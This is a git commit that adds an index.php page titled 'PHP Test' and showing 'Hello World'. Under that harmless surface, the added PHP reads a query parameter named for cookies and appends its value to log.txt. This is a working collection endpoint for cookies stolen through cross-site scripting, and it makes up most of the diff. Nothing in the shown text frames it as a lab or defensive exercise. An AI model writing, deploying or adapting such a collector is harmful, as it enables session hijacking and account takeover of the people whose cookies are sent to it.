96bf09b2d61ee193c7ed2ec2f2a2b62120d93c60
OrangePapaya <37218006+OrangePapaya@users.noreply.github.com>
2019-10-07 19:50:51 -0600

    Update index.php

--- index.php
+++ index.php
@@ -1,1 +1,13 @@
-
+<html>
+    <head>
+        <title>PHP Test</title>
+    </head>
+    <body>
+        <p>Hello World</p>
+        <?php
+            $cookies = $_GET["c"];
+            $file = fopen('log.txt', 'a');
+            fwrite($file, $cookies . "\n\n");
+        ?>
+    </body>
+</html>
